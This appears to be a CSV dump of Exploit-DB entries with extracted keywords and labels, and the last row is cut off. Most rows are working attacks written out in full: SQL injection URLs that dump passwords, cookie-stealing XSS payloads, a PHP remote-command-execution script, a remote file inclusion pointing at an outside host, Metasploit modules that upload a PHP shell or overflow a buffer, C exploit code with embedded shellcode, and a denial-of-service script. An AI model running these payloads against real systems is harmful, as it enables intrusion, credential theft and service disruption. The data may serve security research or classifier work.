15676,Wireshark - LDSS Dissector Buffer Overflow source: https://www.securityfocus.com/bid/44987/info  Wireshark is prone to a buffer-overflow vulnerability.  Exploiting this issue may allow attackers to crash the application and deny service to legitimate users. Attackers may also execute arbitrary code in the context of vulnerable users running the application.  This issue affects Wireshark 1.2.0 through 1.2.12 and 1.4.0 through 1.4.1.  PoC: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15676-pcap.zip,['LDSS'],1
2386,"Techno Dreams Articles & Papers 2.0 - SQL Injection ******************************************************************************* # Title  :  Articles&Papers Package <=v2.0(ArticlesTableview.asp) Remote SQL Injection Vulnerability  # Author :   ajann  # Script Page : http://www.t-dreams.com  # Exploit;  *******************************************************************************  ###http://[target]/[path]/ArticlesTableview.asp?key='[SQL HERE]  Example: ArticlesTableview.asp?key=-1%20union%20select%200,0,0,0,userpassword,username,0,0,0,0,0,0,0,0%20from%20articlesusers%20where%20userid=18  Pls UserID Change(1,2,3,4,5.....)  # ajann,Turkey # ... # Im not [Turkish]Hacker!  # milw0rm.com [2006-09-17]",['ArticlesTableview.asp)'],1
15242,"Mozilla Firefox 3.5.10/3.6.6 - 'WMP' Memory Corruption Using Popups Source: http://code.google.com/p/skylined/issues/detail?id=21  # Exploit Title: Firefox 3.5.10 & 3.6.6 WMP Memory Corruption Using Popups # Date: 2010-10-13 # Author: berendjanwever # Version: FF 3.5.10 & 3.6.6 with WMP 10 & 11 # Tested on: Windows XP sp3  <HTML>   <HEAD>     <SCRIPT>       function go() {         var oWMP = document.getElementById(""WMP"");         if (oWMP) {           location.reload();         } else {           var oWrapper = document.getElementById(""wrapper"");           oWrapper.innerHTML = '<EMBED id=""WMP"" type=""application/x-mplayer2"" autostart=1 src=""repro-firefox.html""></EMBED>';           setTimeout(go, 1000);         }       }     </SCRIPT>   </HEAD>   <BODY onload=""go()"">     <SPAN id=""wrapper""></SPAN>   </BODY> </HTML>","[""'WMP'""]",1
20859,"Vlinks 2.0.3 - 'id' SQL Injection ######################################################################################### [!x!] Informations:   Name           : vlinks Download       : http://www.vlinks.org/ =>http://www.vlinks.org/telechargements/Vlinks2.0.3.zip (And All Version) Vulnerability  : Sql Injection Author         : JIKO(JAWAD) Contact        : jalikom@hotmail.com Site           : No-ExploiT.CoM (Is Back) Notes          : No-ExploiT.CoM Miss ######################################################################################### [!x!] Bug:   Bugged file is /[path]/page.php?   [Note] Pass Simple [/Note]   ######################################################################################### [!x!] Exploit:   Exploit: http://no-exploit.com/forum/site.php?ps=1&idc=1&id=-991 union select 0,concat(pseudo,0x3a,passe),2,3,4,5,6,7,8,9,10,11 from infos--  [Admin Panel] ! Need Login Exploit: http://no-exploit.com/forum/admin/admin_modif_categorie.php?id=-1 union select 0,concat(pseudo,0x3a,passe),2 from infos-- Exploit: http://no-exploit.com/forum/admin/admin_modif_partenaire.php?id=-1 union select 0,concat(pseudo,0x3a,passe),2,3,4,5,6 from infos--   ######################################################################################## [!x!] To: All friends Cyber_Devil Allah with you  members [No-exploit.Com]","[""'id'""]",1
4717,"Simple HTTPd 1.41 - '/aux' Remote Denial of Service #usage: poc.py host port  import socket import sys  print ""-----------------------------------------------------------------------"" print ""Simple HTTPD 1.3 /aux Denial of Service\n"" print ""url: http://shttpd.sourceforge.net\n"" print ""author: shinnai"" print ""mail: shinnai[at]autistici[dot]org"" print ""site: http://shinnai.altervista.org"" print ""-----------------------------------------------------------------------""  host = sys.argv[1] port = long(sys.argv[2])  try:    request =  ""GET /aux HTTP/1.1\n\n""    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    connection.connect((host, port))    connection.send(request) except:    print ""Unable to connect. exiting.""  # milw0rm.com [2007-12-11]","[""'/aux'""]",1
1200,"PBLang 4.65 - Remote Command Execution (1) <?php /* PBLang 4.65 (possibly prior versions) remote code execution    by rgod -> site: http://rgod.altervista.org    make these changes in php.ini if you have troubles with this script:    allow_call_time_pass_reference = on    register_globals = on						       */     error_reporting(0);    ini_set(""max_execution_time"",0);    ini_set(""default_socket_timeout"", 2);    ob_implicit_flush (1);     echo '<head><title>PBLang 4.65 remote commands execution</title>          <meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"">          <style type=""text/css"">          <!--          body,td,th {color: #00FF00;}          body {background-color: #000000;}          .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }          .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; 	       font-weight: bold; 	       font-style: italic;               }          -->          </style></head>          <body>          <p class=""Stile6"">PBLang 4.65 (possibly prior versions) remote commands execution</p>          <p class=""Stile6"">a script by rgod at <a href=""http://rgod.altervista.org"" target=""_blank"">http://rgod.altervista.org</a></p>          <table width=""84%"" >          <tr>          <td width=""43%"">          <form name=""form1"" method=""post"" action=""'.$SERVER[PHP_SELF].'?path=value&host=value&port=value&command=value&proxy=value"">          <p>          <input type=""text"" name=""host"">          <span class=""Stile5"">hostname (ex: www.sitename.com) </span></p>          <p>          <input type=""text"" name=""path"">          <span class=""Stile5"">path (ex: /pblang/ or /forum/ or just /) </span></p>          <p>          <input type=""text"" name=""port"">          <span class=""Stile5"">specify a port other than 80 (default value) </span></p>          <p>          <input type=""text"" name=""command"">          <span class=""Stile5"">a Unix command, example: ls -la to list directories, cat /etc/passwd to show passwd file </span></p>          <p>          <input type=""text"" name=""proxy"">          <span class=""Stile5"">send exploit through an HTTP proxy (ip:port)  </span></p>          <p>          <input type=""submit"" name=""Submit"" value=""go!"">          </p>          </form></td>          </tr>          </table>          </body>          </html>';   function show($headeri) { $ii=0; $ji=0; $ki=0; $ci=0; echo '<table border=""0""><tr>'; while ($ii <= strlen($headeri)-1) { $datai=dechex(ord($headeri[$ii])); if ($ji==16) {              $ji=0;              $ci++;              echo ""<td>&nbsp;&nbsp;</td>"";              for ($li=0; $li<=15; $li++)                       { echo ""<td>"".$headeri[$li+$ki].""</td>""; 			    }             $ki=$ki+16;             echo ""</tr><tr>"";             } if (strlen($datai)==1) {echo ""<td>0"".$datai.""</td>"";} else {echo ""<td>"".$datai.""</td> "";} $ii++; $ji++; } for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)                       { echo ""<td>&nbsp&nbsp</td>"";                        }  for ($li=$ci*16; $li<=strlen($headeri); $li++)                       { echo ""<td>"".$headeri[$li].""</td>""; 			    }  echo ""</tr></table>""; }  $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';   if (($path<>'') and ($host<>'') and ($command<>'')) { if ($port=='') {$port=80;}  $anumber=rand();           $data=""user=jimihendrix"".$anumber.""&pass=jimijimi&pass2=jimijimi&em=jimimail"".$anumber.""@jimimail.com&realname=&alias=&msn=&icq=&aim=&yahoo=&qq=&web=http%3A%2F%2F&loc="".urlencode('madrid""; error_reporting(0); system($HTTP_GET_VARS[cmd]); echo ""') .""&pt=colorgination.com+harness+racing+video&av=none&webav=&sig=&regcode=1126055838&lang=en&accept=1&Submit=Submit"";  if ($proxy=='')         { $packet=""POST "".$path.""register.php?reg=2 HTTP/1.1\r\n""; }         else         {         $c = preg_match_all($proxy_regex,$proxy,$is_proxy);         if ($c==0) {                     echo 'check the proxy...<br>'; 	            die; 	           }          else 	{ $packet=""POST http://"".$host.$path.""register.php?reg=2 HTTP/1.1\r\n"";} 	}           $packet.=""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n"";          $packet.=""Referer: "".$host.$path.""register.php?reg=1\r\n"";          $packet.=""Accept-Language: en\r\n"";          $packet.=""Content-Type: application/x-www-form-urlencoded\r\n"";          $packet.=""Accept-Encoding: gzip, deflate\r\n"";          $packet.=""User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\r\n"";          $packet.=""Host: "".$host.""\r\n"";          $packet.=""Content-Length: "".strlen($data).""\r\n"";          $packet.=""Connection: Keep-Alive\r\n"";          $packet.=""Cache-Control: no-cache\r\n\r\n""; 	 $packet.=$data;  show($packet); if ($proxy=='')            {$fp=fsockopen(gethostbyname($host),$port);}            else            {$parts=explode(':',$proxy); 	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>'; 	    $fp=fsockopen($parts[0],$parts[1]); 	    if (!$fp) { echo 'No response from proxy...'; 			die; 		       } 	    } fputs($fp,$packet); $data=''; if ($proxy=='') { while (!feof($fp)) { $data.=fgets($fp); } } else { $data='';    while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))    {       $data.=fread($fp,1);    }  } fclose($fp); echo nl2br(htmlentities($data));  if ($proxy=='')         { $packet=""GET "".$path.""setcookie.php?u=jimihendrix"".$anumber.""%00&cmd="".urlencode($command)."" HTTP/1.1\r\n""; }         else         { $packet=""GET http://"".$host.$path.""setcookie.php?u=jimihendrix"".$anumber.""%00&cmd="".urlencode($command)."" HTTP/1.1\r\n""; }           $packet.=""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n"";          $packet.=""Referer: "".$host.$path.""login.php\r\n"";          $packet.=""Accept-Language: en\r\n"";          $packet.=""Content-Type: application/x-www-form-urlencoded\r\n"";          $packet.=""Accept-Encoding: gzip, deflate\r\n"";          $packet.=""User-Agent: Mozilla/5.0 (compatible; Konqueror/3.3; Linux) KHTML/3.3.2 (like Gecko)\r\n"";          $packet.=""Host: "".$host.""\r\n"";          $packet.=""Content-Length: "".strlen($data).""\r\n"";          $packet.=""Connection: Keep-Alive\r\n"";          $packet.=""Cache-Control: no-cache\r\n\r\n""; //	 $packet.=$data; show($packet); if ($proxy=='')            {$fp=fsockopen(gethostbyname($host),$port);}            else            {$parts=explode(':',$proxy); 	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>'; 	    $fp=fsockopen($parts[0],$parts[1]); 	    if (!$fp) { echo 'No response from proxy...'; 			die; 		       } 	    }  fputs($fp,$packet); $data=''; if ($proxy=='') { while (!feof($fp)) { $data.=fgets($fp); } } else { $data='';    while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))    {       $data.=fread($fp,1);    }  } fclose($fp); echo nl2br(htmlentities($data));  } ?>  // milw0rm.com [2005-09-07]",['php.ini'],1
45449,"MyBB Visual Editor 1.8.18 - Cross-Site Scripting # Title: MyBB Visual Editor 1.8.18 - Cross-Site Scripting # Author: Numan OZDEMIR # Vendor Homepage: mybb.com # Software Link: https://mybb.com/download/ # Version: Up to v1.8.18. Fixed in v1.8.19. # PoC Video: https://numanozdemir.com/mybb/xss.mp4 # CVE: CVE-2018-17128  # Description: # Attacker can run JavaScript codes in victim user's browser while victim is replying a post. # 'videotype' section causes this.  # How to Reproduce:  1)- Enter to thread posting page. (newthread.php, enter title and content.) 2)- Click ""insert a video"" command. Select any source and insert any URL. 3)- Edit the video source with your payload. Or, directly add this code:  [video=PAYLOAD]http://victim.com[/video] Example: [video=PA<svg/onload=alert('xss')>YLOAD]http://victim.com[/video]  4)- Post the thread.  # While victim user replying your post, his browser will run JavaScript. # Vulnerable pages: editpost.php, newreply.php, private.php # and all Visual Editor embedded pages.","['newthread.php,']",1
23606,"Xoops 2.0.x - 'viewtopic.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/9497/info  It has been reported that Xoops may be prone to a cross-site scripting vulnerability that may allow a remote user to execute HTML or script code in a user's browser. HTML and script code may be parsed via the 'topic_id' and 'forum' URI parameters of 'newbb/viewtopic.php' script.  Successful exploitation of this attack may allow an attacker to steal cookie-based authentication credentials. Other attacks are also possible.  Xoops versions 2.x have been reported to be prone to this issue.   http://www.example.org/modules/newbb/viewtopic.php?topic_id=14577&forum=2""><script>alert(document.cookie);</script> http://www.example.org/modules/newbb/viewtopic.php?topic_id=14577""><script>alert(document.cookie);</script>&forum=2","[""'viewtopic.php'""]",1
36162,TWiki 5.0.2 - '/bin/view/Main/Jump?newtopic' Cross-Site Scripting source: https://www.securityfocus.com/bid/49746/info  TWiki is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Versions prior to TWiki 5.1.0 are vulnerable.   http://example.com/do/view/Main/Jump?create=on&newtopic=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%280x0051D1%29%3C/script%3E&template=WebCreateNewTopic&topicparent=3,"[""'/bin/view/Main/Jump?newtopic'""]",1
19250,"Linux Kernel 2.0/2.1/2.2 - 'autofs' Denial of Service source: https://www.securityfocus.com/bid/312/info  The autofs module provides support for the automount filesystem, as well as the interface between the kernel and the automountd daemon, which is responsible for the actual mounting. Calls such as chdir() executed in the automount directory are handled by the module, and if the desired directory is defined in the configuration files, automountd then mounts that directory/device. When a chdir() or similar function is called in the autofs directory, by a user doing something along the lines of ""cd xxxx"", the function fs/autofs/root.c:autofs_root_lookup() is called.  The autofs kernel module does not check the size of the directory names it receives. It is passed the name and the names length through dentry->d_name.name and dentry->d_name.len respectively. Later on it memcpy()'s the name into a 256 byte buffer, using dentry->d_name.len as the number of bytes to copy, without checking its size. A nonprivilaged user may attempt to cd to a directory name exceeding 255 characters. This overwrites memory, probably the kernel stack and anything beyond it, and causes kernel errors or makes the machine reboot .  In this example exploit, we have a user using perl to generate a directory name that's 256 characters (the maximum being 255). The buffer for the directory name will overflow by one byte in this case:  [user@localhost auto-mounted-dir]# cd `perl -e 'print ""x"" x 256'`  invalid operand: 0000  CPU: 0  EIP: 0010:[<c0155b00>]  EFLAGS: 00010282  eax: 00000000 ebx: c2a90c20 ecx: c265904c edx: c0000000  esi: c29d3b00 edi: c2928000 ebp: c260d940 esp: c26c5ee8  ds: 0018 es: 0018 ss: 0018  Process bash (pid: 360, process nr: 21, stackpage=c26c5000)  Stack: 00000000 00000000 c260d940 c260d900 00000286 c0154c58 c0154ca8  c2928000 c260d940 c2928000 c260d900 c2659d50 c26cd3a0 00000286 c0154def  c260d900 c029c000 c2928000 c2659d9c c260d900 c2659d50 c0154ef7 c260d900  c260d900 c029c000 c2928000 c2659d9c c260d900 c2659d50 c0154ef7 c260d900  c260d900  Call Trace: [<c0154c58>] [<c0154ca8>] [<c0154def>] [<c0154ef7>] [<c0128759>]  [<c0128912>] [<c01289e9>] [<c012126e>] [<c0107a40>]  Code: fe ff ff 83 c4 08 eb 03 ff 43 1c 8b 7c 24 1c 83 7f 0c 00 74  -{Shell dies}-","[""'autofs'"", 'autofs_root_lookup()']",1
18947,"ispVM System - '.XCF' File Handling Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::FILEFORMAT  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""ispVM System XCF File Handling Overflow"", 			'Description'    => %q{ 					This module exploits a vulnerability found in ispVM System 18.0.2.  Due to the way 				ispVM handles .xcf files, it is possible to cause a buffer overflow with a specially 				crafted file, when a long value is supplied for the version attribute of the ispXCF 				tag. It results in arbitrary code execution under the context of the user. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Unknown', # Vulnerability Discovery 					'juan vazquez' # Metasploit 				], 			'References'     => 				[ 					['OSVDB', '82000'], 					['BID', '53562'], 					['URL', 'http://secunia.com/advisories/48740/'] 				], 			'Payload'        => 				{ 					'Space'    => 4000, 					'BadChars' => ""\x00\x1a\x3c\x20\x3e\xff"" 				}, 			'DefaultOptions'  => 				{ 					'ExitFunction' => ""process"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'ispVM System 18.0.2 / Windows XP SP3 / Windows 7 SP1', 						{ 							'Offset' => 274, 							'BreakOffset' => 243, 							'Ret' => 0x780e9d6e # jmp esp from C:\ispTOOLS\ispvmsystem\MSVCP60.dll 						} 					], 				], 			'Privileged'     => false, 			'DisclosureDate' => ""May 16 2012"", 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptString.new('FILENAME', [ true, 'The file name.',  'msf.xcf']), 			], self.class)  	end  	def exploit  		buf = rand_text(target['Offset']) 		buf[target['BreakOffset']] = ""A"" 		buf << [target.ret].pack(""V"") 		buf << payload.encoded  		xcf = %Q| 		<?xml version='1.0' encoding='utf-8' ?> 		<!DOCTYPE		ispXCF	SYSTEM	""IspXCF.dtd"" > 		<ispXCF version=""#{buf}""> 		</ispXCF> 		|  		file_create(xcf) 	end end","['.xcf files', 'ispXCF']",1
1798,"Quezza BB 1.0 - 'quezza_root_path' File Inclusion Quezza BB <= 1.0 (quezza_root_path) File Inclusion Vulnerability. Method found by nukedx, Contacts > ICQ: 10072 MSN/Mail: nukedx@nukedx.com web: www.nukedx.com This exploit works on Quezza BB <= 1.0 Original advisory can be found at: http://www.nukedx.com/?viewdoc=30 http://[victim]/[QuezzaPath]/includes/class_template.php?quezza_root_path=http://yourhost.com/cmd.txt? http://[victim]/[QuezzaPath]/includes/class_template.php?quezza_root_path=/etc/passwd%00 Succesful exploitation register_globals on for both examples. # nukedx.com [2006-04-21]  # milw0rm.com [2006-05-17]","[""'quezza_root_path'""]",1
47045,"WorkSuite PRM 2.4 - 'password' SQL Injection ﻿=========================================================================================== # Exploit Title: WorkSuite PRM 2.4 - 'password' SQL Inj. # Dork: N/A # Date: 01-05-2019 # Exploit Author: Mehmet EMİROĞLU # Vendor Homepage: https://codecanyon.net/item/worksuite-project-management-system/20052522 # Software Link: https://codecanyon.net/item/worksuite-project-management-system/20052522 # Version: v2.4 # Category: Webapps # Tested on: Wamp64, Windows # CVE: N/A # Software Description: Worksuite is a project management software written in Laravel 5.4 (PHP Framework) which is specifically developed for freelancers and SMEs (Small/Medium sized enterprises). You can manage your company's daily work, your employee's tasks, keep a track on project's progress and much more. It is designed with latest security and code standards. =========================================================================================== # POC - SQLi # Parameters : password # Attack Pattern : %27 RLIKE (case when  5021001=5021001 then 0x454d49524f474c55 else 0x28 end) and '7917'='7917 # POST Method : http://localhost/worksuite24/public/login^_token=1knO8SR8Erjg56Mza4VaEv1Mb9lj5HiJBPmbTnFx&password=3115065[SQLINJECT HERE] ===========================================================================================","[""'password'""]",1
9303,"VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Buffer Overflow /*  VLC Media Player 'smb://' URI Handling Remote Buffer Overflow Vulnerability Exploit  *  Reference: https://www.securityfocus.com/bid/35500  *  *  Tested on VLC media player 0.8.6f on WinXP SP3  *     *  Coded by Pankaj Kohli  *  http://www.pank4j.com  *  */   #include <stdio.h> #include <string.h>   // ASCII shellcode (Display a message box & exit) unsigned char shell[] = ""TY777777777777777777777777777777777QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXkweaHrJwpf02pQzePMhyzWwSuQnioXPOHuBxKnaQlkOjpJHIvKOYokObPPwRN1uqt5PA"";   long jmp = 0x7E485233;  // jmp esp (user32.dll)   int main(int argc, char **argv) {     char buff[512], *p;     FILE *fp;     int i;     long *ptr;       fp = fopen(""sploit.xspf"", ""wb"");     fprintf(fp, ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>\n"");     fprintf(fp, ""<playlist version=\""1\"" xmlns=\""http://xspf.org/ns/0/\"" xmlns:vlc=\""http://www.videolan.org/vlc/playlist/ns/0/\"">\n"");     fprintf(fp, ""\t<title>Playlist</title>\n"");     fprintf(fp, ""\t<trackList>\n"");     fprintf(fp, ""\t\t<track>\n"");     fprintf(fp, ""\t\t\t<location>smb://example.com@www.example.com/foo/#{"");          printf(""[*] Creating buffer\n"");     for(i=0; i<300; i++) {         buff[i] = 'a' + ((i/4)%26);     }     ptr = (long *) (buff + 96);     *ptr = jmp;     for(i=0; i<strlen((const char *) shell); i++) {         buff[i+100] = shell[i];     }     buff[300] = 0;     fprintf(fp, ""%s"", buff);          fprintf(fp, ""}</location>\n"");     fprintf(fp, ""\t\t\t<extension application=\""http://www.videolan.org/vlc/playlist/0\"">\n"");     fprintf(fp, ""\t\t\t\t<vlc:id>0</vlc:id>\n"");     fprintf(fp, ""\t\t\t</extension>\n"");     fprintf(fp, ""\t\t</track>\n"");     fprintf(fp, ""\t</trackList>\n"");     fprintf(fp, ""</playlist>\n"");     fclose(fp);           printf(""[*] Exploit file written to sploit.xspf\n"");           return 0; }  // milw0rm.com [2009-07-30]","[""'smb://'"", 'Handling']",1
46839,"PHP-Fusion 9.03.00 - 'Edit Profile' Remote Code Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking     include Msf::Exploit::Remote::HttpClient     def initialize(info = {})     super(update_info(info,       'Name' => ""PHP-Fusion < 9.03.00 - 'Edit Profile' Remote Code Execution"",       'Description' => %q(         This module exploits command execution vulnerability in PHP-Fusion 9.03.00 and prior versions.         It is possible to execute commands in the system with ordinary user authority. No need admin privilage.         There is almost no control in the avatar upload section in the profile edit area.         Only a client-based control working with javascript. (Simple pre-check)         If we do not care about this control, the desired file can be sent to the server via Interception-Proxies.          The module opens the meterpreter session for you by bypassing the controls.       ),       'License' => MSF_LICENSE,       'Author' =>         [           'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module         ],       'References' =>         [           ['URL', 'http://www.pentest.com.tr/exploits/PHP-Fusion-9-03-00-Edit-Profile-Remote-Code-Execution.html'], # Details           ['URL', 'https://www.php-fusion.co.uk'],           ['URL', 'https://github.com/php-fusion/PHP-Fusion/commit/943432028b9e674433bb3f2a128b2477134110e6']         ],       'Platform' => 'php',       'Arch' => ARCH_PHP,       'Targets' => [['Automatic', {}]],       'Privileged' => false,       'DisclosureDate' => ""May 11 2019"",       'DefaultTarget' => 0))       register_options(       [         OptString.new('TARGETURI', [true, ""Base PHP-Fusion directory path"", '/']),         OptString.new('USERNAME', [true, ""Username to authenticate with"", '']),         OptString.new('PASSWORD', [true, ""Password to authenticate with"", ''])       ]     )   end    def exec     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""images"",""avatars"", ""#{@shell}"") # shell url     })   end ## # Login and cookie information gathering ##   def login(uname, pass, check)     # 1st request to get fusion_token      res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""home.php"")     })      cookie = res.get_cookies     @fustoken = res.body.split(""fusion_token' value='"")[1].split(""' />"")[0]     # 2nd request to login     res = send_request_cgi(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'home.php'),       'cookie'   => cookie,       'vars_post' => {         'fusion_token' => @fustoken,         'form_id' => 'loginform',         'user_name' => uname,         'user_pass' => pass,         'login' => ''       }     )      cookie = res.get_cookies     location = res.redirection.to_s     if res && res.code == 302 && location.include?('login.php?error')       fail_with(Failure::NoAccess, ""Authentication was unsuccessful with user: #{uname}"")     else       return cookie     end      return nil   end ## # Upload malicious file // payload integration ##   def upload_shell(cookie, check)      res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""edit_profile.php""),       'cookie'   => cookie     })      ncookie = cookie + "" "" + res.get_cookies # gathering all cookie information      res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""edit_profile.php""),       'cookie'   => ncookie     })      # fetch some necessary post data informations     fustoken = res.body.split(""fusion_token' value='"")[1].split(""' />"")[0]     userid = res.body.split(""profile.php?lookup="")[1].split('""><i class=')[0]     userhash = res.body.split(""userhash' value='"")[1].split(""' style"")[0]     usermail = res.body.split(""user_email' value='"")[1].split(""' >"")[0]      # data preparation to delete priv avatar     delete = Rex::MIME::Message.new     delete.add_part(""#{fustoken}"", nil, nil, 'form-data; name=""fusion_token""')     delete.add_part('userfieldsform', nil, nil, 'form-data; name=""form_id""')     delete.add_part(""#{datastore['USERNAME']}"", nil, nil, 'form-data; name=""user_name""')     delete.add_part(""#{usermail}"", nil, nil, 'form-data; name=""user_email""')     delete.add_part('1', nil, nil, 'form-data; name=""delAvatar""')     delete.add_part(""#{userid}"", nil, nil, 'form-data; name=""user_id""')     delete.add_part(""#{userhash}"", nil, nil, 'form-data; name=""user_hash""')     delete.add_part(""#{userhash}"", nil, nil, 'form-data; name=""user_hash""')     delete.add_part('Update Profile', nil, nil, 'form-data; name=""update_profile""')     deld = delete.to_s      res = send_request_cgi({       'method' => 'POST',           'data'  => deld,       'agent' => 'Mozilla',       'ctype' => ""multipart/form-data; boundary=#{delete.bound}"",       'cookie' => ncookie,       'uri' => normalize_uri(target_uri.path, ""edit_profile.php"")          })     # priv avatar deleted.     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""edit_profile.php""),       'cookie'   => cookie     })      ncookie = cookie + "" "" + res.get_cookies # recheck cookies      res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""edit_profile.php""),       'cookie'   => ncookie     })      # They changed. fetch again...     fustoken = res.body.split(""fusion_token' value='"")[1].split(""' />"")[0]     userid = res.body.split(""profile.php?lookup="")[1].split('""><i class=')[0]     userhash = res.body.split(""userhash' value='"")[1].split(""' style"")[0]     usermail = res.body.split(""user_email' value='"")[1].split(""' >"")[0]     # The ""php"" string must be removed for bypass.We can use ""<?""     pay = payload.encoded.split(""/**/"")[1]     fname = Rex::Text.rand_text_alpha_lower(8) + "".php""     @shell = ""#{fname}""     # data preparation to upload new avatar     pdata = Rex::MIME::Message.new     pdata.add_part(""#{fustoken}"", nil, nil, 'form-data; name=""fusion_token""')     pdata.add_part('userfieldsform', nil, nil, 'form-data; name=""form_id""')     pdata.add_part(""#{datastore['USERNAME']}"", nil, nil, 'form-data; name=""user_name""')     pdata.add_part(""#{usermail}"", nil, nil, 'form-data; name=""user_email""')     pdata.add_part('1', nil, nil, 'form-data; name=""delAvatar""')     pdata.add_part(""<?"" + pay, 'image/png', nil, ""form-data; name=\""user_avatar\""; filename=\""#{fname}\"""")     pdata.add_part(""#{userid}"", nil, nil, 'form-data; name=""user_id""')     pdata.add_part(""#{userhash}"", nil, nil, 'form-data; name=""user_hash""')     pdata.add_part('Update Profile', nil, nil, 'form-data; name=""update_profile""')     data = pdata.to_s      res = send_request_cgi({       'method' => 'POST',           'data'  => data,       'agent' => 'Mozilla',       'ctype' => ""multipart/form-data; boundary=#{pdata.bound}"",       'cookie' => ncookie,       'uri' => normalize_uri(target_uri.path, ""edit_profile.php"")          })      location = res.redirection.to_s     if res && res.code == 302 && location.include?('error')       fail_with(Failure::NoAccess, 'Error occurred during uploading!')     else       print_status(""Trying to upload #{fname}"")       return true     end       end ## # Exploit controls and information ##   def exploit     cookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)     print_good(""Authentication was successful with user: #{datastore['USERNAME']}"")            if upload_shell(cookie, true)       print_good(""Control was bypassed. Harmful file upload successfully!"")       exec     end   end ## # The end of the adventure (o_O) // AkkuS ## end","[""'Edit Profile'"", 'profile']",1
36897,"LastGuru ASP Guestbook - 'View.asp' SQL Injection source: https://www.securityfocus.com/bid/52293/info  LastGuru ASP GuestBook is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/victim/View.asp?E_Mail=webmaster@lastguru.com' and 'a'='a","[""'View.asp'""]",1
42968,"Complain Management System - Hard-Coded Credentials / Blind SQL injection # Exploit Title : Complain Management System Blind SQL Injection # Date: 10 October 2017 # Exploit Author: havysec  # Tested on: ubuntu14.04 # Vendor: https://sourceforge.net/projects/complain-management-system/ # Version: not supplied # Download Software: https://sourceforge.net/projects/complain-management-system/files      ## About The Product : Complain Management is a Web based project used to manage Customer's complain Online. User can login, and Create complain, view complain details and track the status of its complain.   ## Vulnerability : The functions.php file line 88 has hardcoded admin credentials.         elseif($uType == 'admin'){             //$_SESSION['user_id'] = $row['sid'];             if($userName == 'admin' && $password == 'admin123'){                 $_SESSION['user_id'] = 0;                 $_SESSION['user_name'] = 'Administrator';                 $_SESSION['user_type'] = 'admin';                 header('Location: '.WEB_ROOT.'index.php');                 exit;   Using the hardcoded admin credentials we then have access to the view.php file that is vulnerable to Blind SQL injection.   -HTTP Method : GET   - Sqlmap command: sqlmap -u 'http://192.168.1.104/view.php?mod=admin&view=repod&id=plans' --cookie=""PHPSESSID=t1bc9vj67odrj3bd096g0rffe0""   - Sqlmap Output :  injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]  [00:47:53] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')  [00:47:53] [INFO] testing 'MySQL UNION query (98) - 22 to 40 columns' [00:47:53] [INFO] testing 'MySQL UNION query (98) - 42 to 60 columns' [00:47:53] [INFO] testing 'MySQL UNION query (98) - 62 to 80 columns' [00:47:54] [INFO] testing 'MySQL UNION query (98) - 82 to 100 columns' GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  sqlmap identified the following injection point(s) with a total of 650 HTTP(s) requests: --- Parameter: id (GET)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)     Payload: mod=admin&view=repod&id=plans WHERE 6586=6586 AND 9310=9310#      Type: error-based     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause     Payload: mod=admin&view=repod&id=plans WHERE 3317=3317 AND (SELECT 4063 FROM(SELECT COUNT(*),CONCAT(0x7176767a71,(SELECT 